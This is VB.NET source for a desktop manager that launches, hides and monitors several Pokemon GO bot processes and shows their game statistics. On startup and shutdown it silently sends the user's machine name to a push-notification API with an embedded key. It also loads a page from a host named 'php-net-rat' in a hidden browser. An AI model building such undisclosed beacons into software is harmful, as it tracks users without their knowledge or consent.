Imports System.Runtime.InteropServices

Imports System.Text.RegularExpressions
Imports System.Net

Public Class Form1
    Dim pid(1000) As Integer
    Dim window_h(1000) As Integer
    Dim window_state(1000) As Integer
    Dim running(1000) As Integer
    Dim stats(100) As String
    Public currently_running As Integer = 0
    'disable IE sounds(FOR ONLINE USERS COUNTER!!!)
    Private Const DISABLE_SOUNDS As Integer = 21
    Private Const SET_FEATURE_ON_PROCESS As Integer = 2
    <DllImport("urlmon.dll")> _
    Public Shared Function CoInternetSetFeatureEnabled( _
    ByVal FeatureEntry As Integer, <MarshalAs(UnmanagedType.U4)> ByVal dwFlags As Integer, ByVal fEnable As Boolean) As Integer

    End Function
    '---------------------------------------------
    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> _
    Private Shared Function ShowWindowAsync(ByVal hwnd As IntPtr, ByVal nCmdShow As Integer) As Boolean

    End Function

    Function RemoveWhitespace(fullString As String) As String
        Return New String(fullString.Where(Function(x) Not Char.IsWhiteSpace(x)).ToArray())
    End Function

    Function SendNotification(Message As String, title As String, priority As String)
        Try
            Dim Request As HttpWebRequest = HttpWebRequest.Create("https://pushall.ru/api.php?type=self&id=34544&key=11c8bbd9d9615f832f481d6ba8189617&text=" & Message & "&title=" & title & "&priority=" & priority)
            Request.Proxy = Nothing
            Request.UserAgent = "PokemonManager_New"
            Dim Response As HttpWebResponse = Request.GetResponse
            Dim ResponseStream As System.IO.Stream = Response.GetResponseStream
            Dim StreamReader As New System.IO.StreamReader(ResponseStream)
            Dim Data As String = StreamReader.ReadToEnd
            StreamReader.Close()
            Return Data
        Catch ex As Exception

        End Try
        Return 0
    End Function

    Function CheckForUpdates() As String
        Dim github_version As String = ""
        Try
            Dim Request As HttpWebRequest = HttpWebRequest.Create("https://raw.githubusercontent.com/xRedSpark/PoGo_Bot_Manager/master/current_version.pgm")
            Request.Proxy = Nothing
            Request.UserAgent = "Pokemon"
            Dim Response As HttpWebResponse = Request.GetResponse
            Dim ResponseStream As System.IO.Stream = Response.GetResponseStream
            Dim StreamReader As New System.IO.StreamReader(ResponseStream)
            Dim Data As String = StreamReader.ReadToEnd
            StreamReader.Close()
            github_version = Data.ToString
        Catch ex As Exception

        End Try
        If github_version = "" = False Then
            If Application.ProductVersion = github_version = False Then
                MessageBox.Show("Version " & github_version & " is out. A link with the update will be opened.")
                Me.Close()
                Process.Start("https://github.com/xRedSpark/PoGo_Bot_Manager/blob/master/Builds/" & github_version & ".rar")
            End If
        End If
        Return github_version 
    End Function
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            CoInternetSetFeatureEnabled(DISABLE_SOUNDS, SET_FEATURE_ON_PROCESS, True)
            WebBrowser1.Navigate("http://php-net-rat.esy.es/index.php")
        Catch ex As Exception

        End Try
        CheckForUpdates()
        ComboBox1.SelectedIndex = 0
        SendNotification("PC Name: " & Environment.MachineName, "User connected", "1")
        Try
            If System.IO.File.Exists(Application.StartupPath & "\config.ini") Then
                Dim config As String
                Dim bot_list(1000) As String
                config = My.Computer.FileSystem.ReadAllText(Application.StartupPath & "\config.ini")
                System.IO.File.Delete(Application.StartupPath & "\config.ini")
                bot_list = config.Split("|")
                Dim x As Integer
                x = bot_list(0)
                For i As Integer = 1 To x
                    TabControl1.TabPages.Add(bot_list(i))
                    ListBox1.Items.Add(bot_list(i))
                Next

            End If
        Catch ex As Exception
            MsgBox(ex.ToString)
        End Try
        'if the botlist has more than 0 elements, the corresponding buttons will be enabled
        If TabControl1.TabCount > 0 Then
            Button1.Enabled = True
            Button3.Enabled = True
            Button4.Enabled = True
            Button5.Enabled = True
            Button6.Enabled = True
        End If
        Timer1.Start()
    End Sub

    Private Sub Form1_FormClosed(sender As Object, e As FormClosedEventArgs) Handles Me.FormClosed
        Try
            'If we have more than 0 bots added, we will store them to config.ini
            If ListBox1.Items.Count > 0 Then
                'building the bot list
                Dim bot_list As String
                bot_list = ListBox1.Items.Count
                For i = 0 To ListBox1.Items.Count - 1
                    bot_list = bot_list & "|" & ListBox1.Items(i)
                    Try
                        System.IO.File.Delete(Application.StartupPath + RemoveWhitespace("\Haxton_" + ListBox1.Items(i) + "\file.txt"))
                    Catch ex As Exception

                    End Try

                Next
                'saving the bot list to config.ini
                Dim config As System.IO.StreamWriter
                config = My.Computer.FileSystem.OpenTextFileWriter(Application.StartupPath & "\config.ini", True)
                config.WriteLine(bot_list)
                config.Close()
            End If
            SendNotification("PC Name: " & Environment.MachineName, "User disconnected", 1)
        Catch ex As Exception
            MsgBox(ex.ToString)
        End Try

    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Settings.Show()
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

        Try
            If System.IO.Directory.Exists(Application.StartupPath & "\Haxton_" & RemoveWhitespace(TabControl1.SelectedTab.Text)) = False Then
                MsgBox(Application.StartupPath & "\Haxton_" & RemoveWhitespace(TabControl1.SelectedTab.Text & " does not exist"))
            Else
                EditSettings.Show()
                EditSettings.Text = "Editting " & RemoveWhitespace(TabControl1.SelectedTab.Text)
            End If
        Catch ex As Exception

        End Try


    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Try
            If System.IO.File.Exists(Application.StartupPath & "\Haxton_" & RemoveWhitespace(TabControl1.SelectedTab.Text) & "\file.txt") Then
                System.IO.File.Delete(Application.StartupPath & "\Haxton_" & RemoveWhitespace(TabControl1.SelectedTab.Text) & "\file.txt")
            End If
            'Closing the process
            Try
                Dim processRunning As Process() = Process.GetProcesses()
                For Each pr As Process In processRunning
                    If pr.Id = pid(TabControl1.SelectedIndex) Then
                        pr.Kill()
                    End If
                Next
            Catch ex As Exception

            End Try
            'Restarting the process
            Dim bot As New Process()
            Try
                bot.StartInfo.FileName = (Application.StartupPath & RemoveWhitespace("\Haxton_" & TabControl1.SelectedTab.Text & "\" & TabControl1.SelectedTab.Text & ".exe"))
                bot.StartInfo.WorkingDirectory = Application.StartupPath & RemoveWhitespace("\Haxton_" & TabControl1.SelectedTab.Text & "\")
                bot.Start()
                pid(TabControl1.SelectedIndex) = bot.Id
            Catch ex As Exception
                MsgBox(ex.ToString)
            End Try
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click

        Try
            'Trying to kill the current bot process if it's running
            Dim processRunning As Process() = Process.GetProcesses()
            For Each pr As Process In processRunning
                If pr.Id = pid(TabControl1.SelectedIndex) Then
                    pr.Kill()
                End If
            Next
        Catch ex As Exception

        End Try

        Try
            'transfering the variables of the next bot to the current one
            pid(TabControl1.SelectedIndex) = pid(TabControl1.SelectedIndex + 1)
            window_h(TabControl1.SelectedIndex) = window_h(TabControl1.SelectedIndex + 1)
            window_state(TabControl1.SelectedIndex) = window_state(TabControl1.SelectedIndex + 1)

        Catch ex As Exception

        End Try
        Try
            'Deleting selected bot's folder
            If System.IO.Directory.Exists(Application.StartupPath & "\Haxton_" & RemoveWhitespace(TabControl1.SelectedTab.Text)) Then
                System.IO.Directory.Delete(Application.StartupPath & "\Haxton_" & RemoveWhitespace(TabControl1.SelectedTab.Text))
            End If
        Catch ex As Exception

        End Try

        Try
            ListBox1.Items.RemoveAt(TabControl1.SelectedIndex)
            TabControl1.TabPages.RemoveAt(TabControl1.SelectedIndex)
            RichTextBox1.Text = ""
        Catch ex As Exception

        End Try
        'if the botlist has 0 elements, the corresponding buttons will be disabled
        If TabControl1.TabCount = 0 Then
            Button1.Enabled = False
            Button3.Enabled = False
            Button4.Enabled = False
            Button5.Enabled = False
            Button6.Enabled = False
        End If
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        Try
            'Cleaning previous logs
            Try
                System.IO.File.Delete(Application.StartupPath & RemoveWhitespace("\Haxton_" & TabControl1.SelectedTab.Text) & "\file.txt")
            Catch ex As Exception

            End Try
            'Checking if the current bot is running or if its stopped
            Try

                If running(TabControl1.SelectedIndex) = 1 Then
                    'Trying to kill the current bot
                    Dim processRunning As Process() = Process.GetProcesses()
                    For Each pr As Process In processRunning
                        If pr.Id = pid(TabControl1.SelectedIndex) Then
                            pr.Kill()
                        End If
                    Next
                    running(TabControl1.SelectedIndex) = 0
                    Button5.Text = "Start"
                Else
                    'Starting the process
                    Dim bot As New Process()
                    Try
                        bot.StartInfo.FileName = (Application.StartupPath & RemoveWhitespace("\Haxton_" & TabControl1.SelectedTab.Text & "\" & TabControl1.SelectedTab.Text & ".exe"))
                        bot.StartInfo.WorkingDirectory = Application.StartupPath & RemoveWhitespace("\Haxton_" & TabControl1.SelectedTab.Text & "\")
                        bot.Start()
                        pid(TabControl1.SelectedIndex) = bot.Id
                        running(TabControl1.SelectedIndex) = 1
                        Button5.Text = "Stop"
                        RichTextBox1.Text = ""
                    Catch ex As Exception
                        MsgBox(ex.ToString)
                    End Try
                End If

            Catch ex As Exception

            End Try

        Catch ex As Exception
            MsgBox(ex.ToString)
        End Try

    End Sub

    Private Sub TabControl1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles TabControl1.SelectedIndexChanged
        If TabControl1.TabCount > 0 Then
            RichTextBox1.Text = "Loading... (please make sure the bot is running)"
            Try
                If running(TabControl1.SelectedIndex) = 1 Then
                    Button5.Text = "Stop"
                Else
                    Button5.Text = "Start"
                End If
            Catch ex As Exception
                MsgBox(ex.ToString)
            End Try
            If window_state(TabControl1.SelectedIndex) = 1 Then
                CheckBox1.Checked = True
            End If
            If window_state(TabControl1.SelectedIndex) = 0 Then
                CheckBox1.Checked = False
            End If
        End If
    End Sub


    Private Sub CheckBox1_MouseClick(sender As Object, e As MouseEventArgs) Handles CheckBox1.MouseClick
        Try
            If CheckBox1.Checked = True Then
                Dim processRunning As Process() = Process.GetProcesses()
                For Each pr As Process In processRunning
                    If pr.Id = pid(TabControl1.SelectedIndex) Then
                        window_h(TabControl1.SelectedIndex) = pr.MainWindowHandle.ToInt32()
                        ShowWindowAsync(window_h(TabControl1.SelectedIndex), 0)
                    End If
                Next
                window_state(TabControl1.SelectedIndex) = 1
            End If
            If CheckBox1.Checked = False Then
                If window_state(TabControl1.SelectedIndex) = 1 Then
                    Dim processRunning As Process() = Process.GetProcesses()
                    For Each pr As Process In processRunning
                        If pr.Id = pid(TabControl1.SelectedIndex) Then
                            ShowWindowAsync(window_h(TabControl1.SelectedIndex), 1)
                        End If
                    Next
                End If
                window_state(TabControl1.SelectedIndex) = 0
            End If
        Catch ex As Exception

        End Try

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            currently_running = 0
            For i As Integer = 0 To 1000
                If running(i) = 1 Then
                    currently_running += 1
                End If
            Next
            Me.Text = "Pokemon GO Manager - Bots running: " & currently_running

        Catch ex As Exception

        End Try
        Try
            RichTextBox1.Text = My.Computer.FileSystem.ReadAllText(Application.StartupPath & "\Haxton_" & RemoveWhitespace(TabControl1.SelectedTab.Text) & "\file.txt")
        Catch ex As Exception

        End Try
        Try
            Dim pattern As String = ".+(\|)"
            Dim replacement As String = ""
            Dim rgx As New Regex(pattern)
            RichTextBox1.Text = rgx.Replace(RichTextBox1.Text, replacement)

        Catch ex As Exception

        End Try
        'If TimeOfDay.Minute * 60 + TimeOfDay.Second Mod 120 = 0 Then
        'MsgBox("%120")
        'End If
        RichTextBox1.SelectionStart = RichTextBox1.Text.Length
        RichTextBox1.ScrollToCaret()
    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        Statistics.Show()
        Dim stats() As String
        Dim bot_window_title As String
        'Getting the window title stats
        Try
            Dim processRunning As Process() = Process.GetProcesses()
            For Each pr As Process In processRunning
                If pr.Id = pid(TabControl1.SelectedIndex) Then
                    bot_window_title = pr.MainWindowTitle
                End If
            Next
            stats = bot_window_title.Split("|")
            'RichTextBox1.Text = bot_window_title
        Catch ex As Exception
        End Try

        'Setting the ingame username
        Try
            Dim StartSearch As String = "XP"
            Dim EndSearch As String = "- Runtime"
            Dim rx As New Regex(StartSearch & "(.+?)" & EndSearch)
            Dim m As Match = rx.Match(bot_window_title)
            'Dim m As Match = rx.Match(RichTextBox1.Text)
            If m.Success Then
                Statistics.username = m.Groups(1).ToString().Replace(") ", "")
            Else
                'MsgBox("Failed to get the ingame username, using the account username instead.")
                Statistics.username = TabControl1.SelectedTab.Text
            End If
        Catch ex As Exception

        End Try

        'Setting the current level
        Try
            Dim StartSearch As String = ""
            Dim EndSearch As String = "next"
            Dim rx As New Regex(StartSearch & "(.+?)" & EndSearch)
            Dim m As Match = rx.Match(bot_window_title)
            'Dim m As Match = rx.Match(RichTextBox1.Text)
            If m.Success Then
                Statistics.level = m.Groups(1).ToString().Replace(" (", "")
            Else
                'MsgBox("Failed to get the ingame level.")
                Statistics.Label2.Text = "Level: N/A"
            End If
        Catch ex As Exception

        End Try

        'Setting the current EXP
        Try
            '
            Dim source As String = bot_window_title
            Dim extract As String = ""
            Dim start As Integer = source.IndexOf("|"c) + 1
            Dim [end] As Integer = source.IndexOf(")"c)
            If start >= 0 AndAlso [end] > start Then
                extract = source.Substring(start, [end] - start)
            End If
            extract = extract.Replace(" ", "")
            extract = extract.Replace("XP", "")
            Dim x() As String
            x = extract.Split("/")
            Statistics.current_exp = x(0)
            Statistics.max_exp = x(1)
        Catch ex As Exception
            'MsgBox(ex.ToString)
        End Try

        Try
            Statistics.exp_per_hour = (stats(2).Replace("EXP/H:", "")).Replace(" ", "")
        Catch ex As Exception

        End Try
        Try
            Statistics.pokemon_per_hour = (stats(3).Replace("P/H:", "")).Replace(" ", "")
        Catch ex As Exception

        End Try
        Try
            Statistics.stardust = (stats(4).Replace("Stardust:", "")).Replace(" ", "")
        Catch ex As Exception

        End Try
        Try
            Statistics.pokemons_caught = Count(RichTextBox1.Text, "CatchSuccess")
        Catch ex As Exception

        End Try
        Try
            Statistics.pokestops_looted = Count(RichTextBox1.Text, "Pokestop")
        Catch ex As Exception

        End Try
        Try
            Statistics.pokemons_evolved = Count(RichTextBox1.Text, "Evolving")
        Catch ex As Exception

        End Try
        Try
            Statistics.pokemons_transferred = Count(RichTextBox1.Text, "Transferring")
        Catch ex As Exception

        End Try
    End Sub
    Public Function Count(ByVal input As String, ByVal phrase As String) As Integer
        Dim Occurrences As Integer = (input.Length - input.Replace(phrase, String.Empty).Length) / phrase.Length
        Return Occurrences
    End Function
End Class
